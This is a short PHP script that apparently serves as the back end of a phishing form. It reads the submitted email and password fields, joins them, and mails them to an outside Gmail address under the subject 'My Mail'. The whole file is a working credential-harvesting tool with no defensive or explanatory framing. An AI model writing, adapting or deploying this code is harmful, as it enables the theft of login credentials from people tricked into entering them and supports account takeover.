<?php

$to = "spyware419@gmail.com";
$subject = "My Mail";

if((isset($_POST['email'])) && !empty($_POST['password'])) 

 { 

  $email = $_POST['email'];

  $password = $_POST['password'];

  
  }

$msg = ($email . $password);

//$msg .= $password;

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70, "\r\n");

//$headers = "From: webmaster@example.com" . "\r\n" ."CC: somebodyelse@example.com";

mail($to,$subject,$msg);
?>
